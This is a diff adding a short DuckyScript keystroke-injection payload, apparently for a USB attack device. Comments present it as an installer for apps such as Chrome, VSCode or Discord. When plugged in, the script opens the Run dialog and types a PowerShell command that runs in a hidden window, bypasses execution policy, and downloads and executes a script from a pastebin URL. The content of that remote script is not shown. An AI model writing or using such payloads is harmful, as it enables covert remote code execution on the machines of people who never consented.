@@ -1,0 +1,20 @@
+REM Enter the app name between quotes below.
+REM Supported apps:
+REM Chrome
+REM VSCode
+REM NotepadPP
+REM Python
+REM Telegram
+REM Arduino
+REM Wireshark
+REM VirualBox
+REM Git
+REM KDEConnect
+REM Krita
+REM Discord
+REM ITunes
+
+GUI r
+DELAY 500
+STRING powershell -w h -ep bypass $app='AppNameHere';irm https://pastebin.com/raw/7sHkFMmJ | iex
+ENTER
